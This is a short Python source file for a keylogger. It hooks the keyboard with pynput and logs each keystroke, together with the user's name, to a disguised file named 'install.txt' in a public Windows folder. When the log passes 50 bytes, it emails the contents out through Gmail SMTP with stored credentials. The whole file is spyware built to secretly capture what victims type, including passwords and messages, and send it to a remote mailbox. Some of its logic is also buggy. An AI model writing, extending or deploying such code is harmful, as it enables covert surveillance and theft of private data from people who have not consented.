from pynput import keyboard
from multiprocessing import Queue
import smtplib, os, time, getpass
from config_variables import *

file ="C:/Users/Public/Videos/install.txt"
last_time = 0
username = getpass.getuser()
file_info = os.stat(file)
file_size = file_info.st_size

if not os.path.isfile(file):
    f = open(file, 'w')
    file.close()

def writeToFile(text):
	global file

	f = open(file, 'a')
	f.write(text+'\n')
	f.close()

def send(text):
    email_text = "\r\n".join([
      "From: " + SENDER_EMAIL,
      "To: "+ RECIEVER_EMAIL,
      "Subject: logs",
      "",
      text
      ])
    
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.ehlo()
    server.starttls()
    server.login(SENDER_EMAIL, SENDER_PASSWORD)
    server.sendmail(SENDER_EMAIL, RECIEVER_EMAIL, email_text)
    server.quit()

def main():
	if(file_size > 50):
	    with open(file, 'r') as f:
	        text = f.read()
	    send(text)
	    open(file, 'w').close()

	writeToFile('['+username+']')

if __name__ == '__main__':
	main()

def on_press(key):
    global last_time

    if time.time() - last_time > 1:
        writeToFile(' ')
    try:
        writeToFile(key.char)        
    except AttributeError:
        if key == keyboard.Key.space:
            writeToFile('space')
    except TypeError:
        pass

    last_time = time.time()

with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()
